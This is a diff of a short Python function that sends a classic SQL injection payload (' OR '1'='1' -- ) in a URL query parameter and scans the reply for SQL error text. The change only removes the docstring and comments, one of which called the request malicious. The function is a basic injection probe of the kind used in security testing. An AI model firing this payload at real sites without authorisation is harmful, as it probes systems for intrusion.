@@ -1,24 +1,16 @@
 import requests
 
 def sql_injection(url):
-    """
-    Simulates an SQL Injection test on the provided URL by appending a typical payload.
-
-    Args:
-        url (str): The target URL to test.
-
-    Returns:
-        str: Result of the SQL injection attempt.
-    """
+   
     payload = "' OR '1'='1' -- "
     target_url = f"{url}?input={payload}"
 
     try:
-        # Send the malicious request
+        
         response = requests.get(target_url, timeout=10)
-        response.raise_for_status()  # Raise for HTTP errors
+        response.raise_for_status()  
 
-        # Simulate checking for SQL injection success
+        
         if "SQL syntax" in response.text or "mysql" in response.text.lower():
             return f"SQL Injection detected on {url} with payload {payload}"
         else:
